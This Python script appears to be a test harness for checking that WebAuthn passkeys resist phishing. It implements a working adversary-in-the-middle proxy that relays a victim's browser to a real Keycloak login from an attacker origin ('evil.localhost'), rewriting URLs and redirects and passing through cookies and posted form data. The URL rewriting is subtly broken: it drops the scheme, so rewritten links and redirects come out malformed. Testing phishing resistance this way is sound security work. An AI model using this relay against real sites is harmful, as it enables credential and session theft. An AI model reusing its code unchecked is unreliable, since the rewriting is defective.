#!/usr/bin/env python3
"""A real adversary-in-the-middle proxy, for the S9 phishing test.

WHAT THIS IS
    Not a mock-up of a phishing site. It is a reverse proxy that relays a victim's
    browser to the REAL Keycloak, rewriting responses so the victim never leaves
    the attacker's origin. Everything the victim sees is genuinely served by the
    real identity provider; only the origin differs.

WHY IT IS BUILT THIS WAY
    A fake login page proves nothing — a victim would not type a passkey into it.
    The whole claim under test is that a user who does everything right, on a page
    they cannot distinguish from the real one, still cannot be phished. So the page
    has to be the real one.

HOW THE ORIGIN DIFFERS, AND WHY THAT IS THE WHOLE POINT
    The proxy listens on `evil.localhost` and talks to Keycloak on `localhost`.
    Upstream requests carry Keycloak's own Host header so the real server is happy;
    downstream, every absolute URL is rewritten to the proxy's origin so the
    browser's address bar — and critically its ORIGIN — stays on `evil.localhost`.

    WebAuthn binds an assertion to the relying-party ID, which must be a
    registrable-domain suffix of the page's origin. `app.localhost` is not a
    suffix of `evil.localhost`, so the browser must refuse to produce an assertion.

    Ports are deliberately NOT used to separate the two: the relying-party ID
    IGNORES the port, so `localhost:8081` and `localhost:8080` share `localhost`
    and a port-based proxy would show a FALSE BYPASS.

Usage:
    python3 phishing_proxy.py --listen evil.localhost:9001 --upstream localhost:8080
"""
from __future__ import annotations

import argparse
import http.server
import re
import socketserver
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request

LISTEN_HOST = "evil.localhost"
LISTEN_PORT = 9001
UPSTREAM_HOST = "localhost"
UPSTREAM_PORT = 8080

# Headers that must not be blindly relayed.
HOP_BY_HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade", "content-encoding",
    "content-length",
}


class Proxy(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    upstream = f"http://{UPSTREAM_HOST}:{UPSTREAM_PORT}"
    listen_authority = f"{LISTEN_HOST}:{LISTEN_PORT}"

    # -- helpers ------------------------------------------------------------
    def _rewrite(self, body: bytes, content_type: str) -> bytes:
        """Point every absolute upstream URL at the proxy's own origin.

        Without this the victim's browser would be sent back to the real host at
        the first redirect, and the test would silently stop testing anything.
        """
        if not any(t in content_type for t in ("html", "json", "javascript", "css", "text")):
            return body
        try:
            text = body.decode("utf-8")
        except UnicodeDecodeError:
            return body
        for scheme in ("http", "https"):
            text = text.replace(f"{scheme}://{UPSTREAM_HOST}:{UPSTREAM_PORT}", self.listen_authority)
            text = text.replace(f"{scheme}://{UPSTREAM_HOST}", self.listen_authority)
        # JSON-escaped forms (Keycloak emits these in some endpoints)
        text = text.replace(f"http:\\/\\/{UPSTREAM_HOST}:{UPSTREAM_PORT}", self.listen_authority)
        return text.encode("utf-8")

    def _relay(self, method: str) -> None:
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else None

        url = self.upstream + self.path
        req = urllib.request.Request(url, data=body, method=method)
        for k, v in self.headers.items():
            if k.lower() in HOP_BY_HOP or k.lower() == "host":
                continue
            req.add_header(k, v)
        # Upstream must see Keycloak's own authority, or it refuses the request.
        req.add_header("Host", f"{UPSTREAM_HOST}:{UPSTREAM_PORT}")

        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                status, headers, raw = r.status, r.headers, r.read()
        except urllib.error.HTTPError as e:
            status, headers, raw = e.code, e.headers, e.read()
        except Exception as e:
            self.send_error(502, f"proxy could not reach upstream: {type(e).__name__}")
            return

        ctype = headers.get("Content-Type", "")
        out = self._rewrite(raw, ctype)

        # Location headers must be rewritten too, or the victim escapes the origin.
        self.send_response(status)
        for k, v in headers.items():
            lk = k.lower()
            if lk in HOP_BY_HOP or lk == "content-length":
                continue
            if lk == "location":
                v = self._rewrite(v.encode(), "text").decode()
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        self.wfile.write(out)

    # -- verbs --------------------------------------------------------------
    def do_GET(self):
        self._relay("GET")

    def do_POST(self):
        self._relay("POST")

    def do_HEAD(self):
        self._relay("HEAD")

    def log_message(self, fmt, *args):
        # Keep it quiet unless something is wrong; the harness prints its own story.
        return


class Threaded(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def main() -> int:
    global LISTEN_HOST, LISTEN_PORT, UPSTREAM_HOST, UPSTREAM_PORT
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", default=f"{LISTEN_HOST}:{LISTEN_PORT}")
    ap.add_argument("--upstream", default=f"{UPSTREAM_HOST}:{UPSTREAM_PORT}")
    # The address the VICTIM sees, which is not always the address we bind.
    # Binding to 0.0.0.0 is necessary when Chrome maps a name to loopback itself,
    # but rewriting URLs to "0.0.0.0:9001" would send the browser nowhere.
    ap.add_argument("--public", default=None,
                    help="host:port to rewrite URLs to (defaults to --listen)")
    a = ap.parse_args()
    LISTEN_HOST, _, LISTEN_PORT = a.listen.partition(":")
    UPSTREAM_HOST, _, UPSTREAM_PORT = a.upstream.partition(":")
    Proxy.listen_authority = a.public or f"{LISTEN_HOST}:{LISTEN_PORT}"
    Proxy.upstream = f"http://{UPSTREAM_HOST}:{UPSTREAM_PORT}"

    srv = Threaded((LISTEN_HOST, int(LISTEN_PORT)), Proxy)
    print(f"  proxy {LISTEN_HOST}:{LISTEN_PORT} -> {UPSTREAM_HOST}:{UPSTREAM_PORT}", flush=True)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
